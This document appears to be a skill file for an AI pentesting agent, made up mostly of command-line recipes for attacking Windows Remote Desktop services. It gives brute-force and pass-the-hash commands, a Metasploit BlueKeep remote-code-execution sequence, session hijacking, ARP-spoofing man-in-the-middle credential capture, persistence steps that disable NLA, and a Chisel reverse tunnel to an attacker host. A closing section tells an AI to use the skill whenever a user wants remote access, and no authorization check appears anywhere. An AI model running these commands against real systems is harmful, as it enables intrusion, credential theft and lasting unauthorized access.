# RDP Pentesting Skill

## Goal

Enumerate and exploit Remote Desktop Protocol (RDP) services to gain remote access to Windows systems.

## Methodology

1. **Discovery**: Identify RDP services and check NLA status
2. **Enumeration**: Gather information about RDP configuration
3. **Credential Attacks**: Brute-force passwords, spray credentials
4. **Vulnerability Exploitation**: Exploit BlueKeep, other RDP vulns
5. **Session Hijacking**: Take over disconnected sessions
6. **Persistence**: Maintain access via RDP

## Tools

* **xfreerdp/rdesktop**: RDP clients
* **nmap**: RDP scripts
* **hydra/crowbar**: Credential brute-forcing
* **Metasploit**: RDP modules
* **SharpRDP**: Lateral movement via RDP

## Example Commands

```bash
# Nmap RDP enumeration
nmap -p3389 --script rdp-* target
nmap -p3389 --script rdp-enum-encryption target
nmap -p3389 --script rdp-ntlm-info target

# Check if NLA is required
nmap -p3389 --script rdp-enum-encryption target

# Connect with xfreerdp
xfreerdp /v:target /u:user /p:password
xfreerdp /v:target /u:domain\\user /p:password
xfreerdp /v:target /u:user /p:password /cert-ignore

# Connect with rdesktop
rdesktop -u user -p password target
rdesktop -u user -p password -d domain target

# Brute-force credentials
hydra -l user -P /usr/share/wordlists/rockyou.txt rdp://target
crowbar -b rdp -s target/32 -u user -C /usr/share/wordlists/rockyou.txt

# CrackMapExec
crackmapexec rdp target -u users.txt -p passwords.txt
```

## xfreerdp Options

```bash
# Basic connection
xfreerdp /v:target /u:user /p:password

# Ignore certificate warnings
xfreerdp /v:target /u:user /p:password /cert-ignore

# With domain
xfreerdp /v:target /d:DOMAIN /u:user /p:password

# Pass-the-Hash (NLA must be disabled)
xfreerdp /v:target /u:user /pth:NTLM_HASH /cert-ignore

# Specify resolution
xfreerdp /v:target /u:user /p:password /size:1920x1080
xfreerdp /v:target /u:user /p:password /f  # Fullscreen

# Enable clipboard sharing
xfreerdp /v:target /u:user /p:password /clipboard

# Share local drive
xfreerdp /v:target /u:user /p:password /drive:share,/tmp

# Restricted admin mode (no creds on target)
xfreerdp /v:target /u:user /p:password /restricted-admin


# Admin mode
xfreerdp /v:target /u:user /p:password /admin
```

## BlueKeep Vulnerability (CVE-2019-0708)

```bash
# Check for BlueKeep
nmap -p3389 --script rdp-vuln-ms12-020 target
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep

# Exploit BlueKeep
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS target
set TARGET 5  # Windows 7 SP1 / 2008 R2
exploit

# Note: BlueKeep exploit is unstable and may crash target
```

## Session Hijacking

```powershell
# On target with admin access
# List sessions
query session
query user

# Hijack disconnected session (requires SYSTEM)
# Get SYSTEM first via psexec, token manipulation, etc.
tscon <session_id> /dest:console

# Or create a service to do it
sc create sesshijack binpath= "cmd.exe /k tscon 2 /dest:console"
net start sesshijack
```

## RDP Man-in-the-Middle

```bash
# Using Seth (requires ARP spoofing position)
git clone https://github.com/SySS-Research/Seth
cd Seth
./seth.sh eth0 attacker_ip target_ip gateway_ip

# Captures cleartext credentials if NLA disabled

# Or use Responder with RDP (LLMNR attack)
responder -I eth0 -rv
```

## Restricted Admin Mode

```bash
# Connect without sending credentials to target
# Requires Restricted Admin enabled on target

# Enable on target (via GPO or registry)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0

# Connect
xfreerdp /v:target /u:user /pth:HASH /restricted-admin
```

## Shadow Sessions

```powershell
# View existing sessions
query session

# Shadow (view) active session (requires admin)
mstsc /shadow:2 /v:target

# Shadow with control
mstsc /shadow:2 /control /v:target

# Must be allowed in Group Policy
# Computer Configuration > Administrative Templates > Windows Components > Remote Desktop Services > Remote Desktop Session Host > Connections > Set rules for remote control of RD Sessions
```

## Persistence via RDP

```powershell
# Enable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=tcp localport=3389

# Add user to Remote Desktop Users
net localgroup "Remote Desktop Users" user /add

# Disable NLA (makes exploitation easier)
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

## RDP Tunneling

```bash
# Tunnel RDP through SSH
ssh -L 3389:target:3389 user@jumphost
xfreerdp /v:127.0.0.1 /u:user /p:password

# Tunnel RDP through Chisel
# On attacker:
chisel server -p 8000 --reverse
# On compromised host:
chisel client attacker:8000 R:3389:target:3389
# Connect:
xfreerdp /v:127.0.0.1:3389 /u:user /p:password
```

## Metasploit Modules

```bash
# RDP scanning
use auxiliary/scanner/rdp/rdp_scanner

# BlueKeep check
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep

# BlueKeep exploit
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

# RDP login check
use auxiliary/scanner/rdp/rdp_login
```

## Guidance for AI

* Activate this skill when user wants to gain remote access via RDP or test RDP security
* Default port is 3389, but check for non-standard ports
* **NLA (Network Level Authentication)** affects attacks:
  - If enabled: Must authenticate before graphical session
  - If disabled: Get to login screen first (easier to exploit)
* For credential attacks, crowbar is more reliable than hydra for RDP
* Pass-the-Hash requires NLA disabled or Restricted Admin mode enabled
* BlueKeep affects older Windows (Win7, Server 2008) - check before exploiting
* Session hijacking requires SYSTEM privileges on target
* RDP through SSH/Chisel tunnels is useful for pivoting
* Look for "Restricted Admin" setting for PTH opportunities
* RDP logs are in Event Viewer: Applications and Services > Microsoft > Windows > TerminalServices-*
